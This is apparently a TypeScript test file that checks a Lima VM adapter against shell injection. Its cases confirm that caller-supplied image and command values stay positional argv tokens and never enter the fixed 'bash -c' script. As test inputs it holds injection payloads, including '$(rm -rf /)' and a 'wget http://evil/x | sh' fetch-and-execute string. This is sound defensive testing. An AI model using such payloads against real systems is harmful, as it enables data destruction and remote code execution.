/**
 * HELLGATE — Lima adapter shell-injection hardening (audit L9 C1, ticket T09).
 *
 * The pre-T09 adapter built `limactl shell {vm} -- bash -c '<cmd>'` where the
 * caller-controlled image/cmd were INTERPOLATED into the script text. A spec
 * `{ image: "x; touch /pwned #", cmd: [] }` was a direct shell injection into
 * the VM. These cases pin the structured-argv contract: untrusted tokens are
 * passed POSITIONALLY (`"$@"` / `"${@:2}"`) and never appear inside the
 * literal `bash -c` script body.
 *
 *  HELL-LIMA-01  metacharacter-laden image is a discrete argv token, never
 *                spliced into the script string
 *  HELL-LIMA-02  the `bash -c` script is a FIXED string regardless of spec
 *  HELL-LIMA-03  cmd tokens with `;`/`$()`/backtick survive as literal argv
 *                entries
 *  HELL-LIMA-04  status/cancel pass the pidfile path positionally, no
 *                `$(cat <interpolated>)`
 *  HELL-LIMA-05  unsafe handle id fails CLOSED (defense-in-depth)
 *  HELL-LIMA-06  end-to-end: a malicious spec spawns with the exact injected
 *                string present ONLY as an argv element, not the script
 *  HELL-LIMA-07  timeoutMs:0 never spawns + status reports terminal timeout
 *  HELL-LIMA-08  logs uses `tail -f` structured argv (no `bash -c` at all)
 */
import { describe, expect, test } from "bun:test"
import {
  composeLimaCancelArgv,
  composeLimaSpawnArgv,
  composeLimaStatusArgv,
  createLimaAdapter,
  type LimaExecResult,
  type LimaProcess,
  type RemoteSpec,
  safeLimaId,
} from "@/remote"

const baseSpec = (over: Partial<RemoteSpec> = {}): RemoteSpec => ({
  image: "ubuntu:24.04",
  cmd: ["echo", "hi"],
  ...over,
})

const makeProc = (
  results: ReadonlyArray<LimaExecResult>,
  streamLines: ReadonlyArray<string> = [],
): { proc: LimaProcess; argvLog: string[][]; streamArgvLog: string[][] } => {
  let i = 0
  const argvLog: string[][] = []
  const streamArgvLog: string[][] = []
  const proc: LimaProcess = {
    async exec(argv) {
      argvLog.push([...argv])
      return results[i++] ?? { exitCode: 0, stdout: "", stderr: "" }
    },
    async *stream(argv) {
      streamArgvLog.push([...argv])
      for (const line of streamLines) yield line
    },
  }
  return { proc, argvLog, streamArgvLog }
}

const SCRIPT_INDEX = 6 // position of the `bash -c` script body in the argv

describe("lima injection hardening (L9 C1)", () => {
  test("HELL-LIMA-01: metacharacter image is a discrete token, not spliced into script", () => {
    const evil = "x; touch /pwned #"
    const argv = composeLimaSpawnArgv("vm0", "quanta-remote-abc", baseSpec({ image: evil, cmd: [] }))
    const script = argv[SCRIPT_INDEX] ?? ""
    expect(script.includes(evil)).toBe(false)
    expect(argv).toContain(evil) // present ONLY as its own argv element
  })

  test("HELL-LIMA-02: bash -c script is a FIXED string regardless of spec", () => {
    const a = composeLimaSpawnArgv("vm0", "id-1", baseSpec({ image: "a", cmd: ["b"] }))
    const b = composeLimaSpawnArgv(
      "vm0",
      "id-1",
      baseSpec({ image: "$(rm -rf /)", cmd: ["`whoami`", "&& curl evil"] }),
    )
    expect(a[SCRIPT_INDEX]).toBe(b[SCRIPT_INDEX])
    // sanity: the fixed script references positional args, not interpolation
    expect(a[SCRIPT_INDEX]).toContain('"$@"')
  })

  test("HELL-LIMA-03: cmd tokens with shell metachars survive as literal argv entries", () => {
    const argv = composeLimaSpawnArgv("vm0", "id-1", baseSpec({ image: "img", cmd: ["$(id)", "`x`", ";rm"] }))
    expect(argv).toContain("$(id)")
    expect(argv).toContain("`x`")
    expect(argv).toContain(";rm")
    const script = argv[SCRIPT_INDEX] ?? ""
    expect(script.includes("$(id)")).toBe(false)
    expect(script.includes("`x`")).toBe(false)
  })

  test("HELL-LIMA-04: status/cancel pass pidfile positionally, no interpolated $(cat)", () => {
    const s = composeLimaStatusArgv("vm0", "quanta-remote-1")
    const c = composeLimaCancelArgv("vm0", "quanta-remote-1")
    expect(s[SCRIPT_INDEX]).not.toContain("quanta-remote-1")
    expect(c[SCRIPT_INDEX]).not.toContain("quanta-remote-1")
    expect(s).toContain("/tmp/quanta-remote-1.pid")
    expect(c).toContain("/tmp/quanta-remote-1.pid")
  })

  test("HELL-LIMA-05: unsafe handle id fails CLOSED", () => {
    expect(safeLimaId("quanta-remote-9e1f")).toBe("quanta-remote-9e1f")
    expect(safeLimaId("a;b")).toBeNull()
    expect(safeLimaId("a/b")).toBeNull()
    expect(safeLimaId("$(x)")).toBeNull()
    expect(safeLimaId("a b")).toBeNull()
  })

  test("HELL-LIMA-06: e2e spawn — injected string only ever an argv element", async () => {
    const evil = "alpine && wget http://evil/x | sh"
    const { proc, argvLog } = makeProc([{ exitCode: 0, stdout: "", stderr: "" }])
    const adapter = createLimaAdapter({ process: proc, vm: "vm0", uuid: () => "u1" })
    const res = await adapter.spawn(baseSpec({ image: evil, cmd: [] }))
    expect(res.ok).toBe(true)
    const argv = argvLog[0] ?? []
    expect(argv).toContain(evil)
    expect((argv[SCRIPT_INDEX] ?? "").includes(evil)).toBe(false)
  })

  test("HELL-LIMA-07: timeoutMs:0 never spawns + status reports terminal timeout", async () => {
    const { proc, argvLog } = makeProc([])
    const adapter = createLimaAdapter({ process: proc, vm: "vm0", uuid: () => "u2", nowMs: () => 7 })
    const spawn = await adapter.spawn(baseSpec({ timeoutMs: 0 }))
    expect(spawn.ok).toBe(true)
    expect(argvLog.length).toBe(0) // never reached limactl
    if (!spawn.ok) throw new Error("unreachable")
    const status = await adapter.status(spawn.value)
    expect(status.ok).toBe(true)
    if (!status.ok) throw new Error("unreachable")
    expect(status.value.kind).toBe("failed")
    expect(status.value.reason).toBe("timeout")
  })

  test("HELL-LIMA-08: logs uses tail -f structured argv (no bash -c)", async () => {
    const { proc, streamArgvLog } = makeProc([{ exitCode: 0, stdout: "", stderr: "" }], ["line"])
    const adapter = createLimaAdapter({ process: proc, vm: "vm0", uuid: () => "u3" })
    const spawn = await adapter.spawn(baseSpec())
    if (!spawn.ok) throw new Error("spawn failed")
    const out: string[] = []
    for await (const l of adapter.logs(spawn.value)) out.push(l)
    expect(out).toEqual(["line"])
    const argv = streamArgvLog[0] ?? []
    expect(argv).not.toContain("-c") // no bash -c shell layer
    expect(argv).toContain("tail")
    expect(argv).toContain("-f")
  })
})
